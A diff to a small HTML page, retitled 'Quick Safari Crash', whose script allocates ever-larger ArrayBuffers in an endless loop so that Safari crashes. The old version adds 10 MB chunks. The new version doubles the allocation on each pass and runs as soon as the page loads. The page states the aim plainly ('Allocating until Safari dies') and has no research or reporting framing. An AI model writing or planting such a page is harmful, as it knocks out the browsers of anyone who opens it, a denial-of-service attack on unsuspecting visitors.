@@ -2,35 +2,24 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Safari Crash Test</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quick Safari Crash</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
   <style>
-    /* Visual cue that it's running */
-    body { 
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: sans-serif;
-      background: #f8f8f8;
-      color: #333;
-    }
+    body{display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;background:#f8f8f8;color:#333}
   </style>
 </head>
 <body>
   <div>
-    <h1>Crashing Safari…</h1>
-    <p>Allocating memory until crash.</p>
+    <h1>Crashing Fast…</h1>
+    <p>Allocating until Safari dies.</p>
   </div>
-
   <script>
-    (function exhaustMemory() {
-      const allocations = [];
-      const CHUNK_SIZE = 10 * 1024 * 1024; // 10 MB
-
-      while (true) {
-        allocations.push(new ArrayBuffer(CHUNK_SIZE));
-        console.log('Allocated', allocations.length * CHUNK_SIZE, 'bytes');
+    (function crashFast(){
+      const a=[];
+      let size=1;
+      while(true){
+        a.push(new ArrayBuffer(size*1024*1024));
+        size*=2;
       }
     })();
   </script>
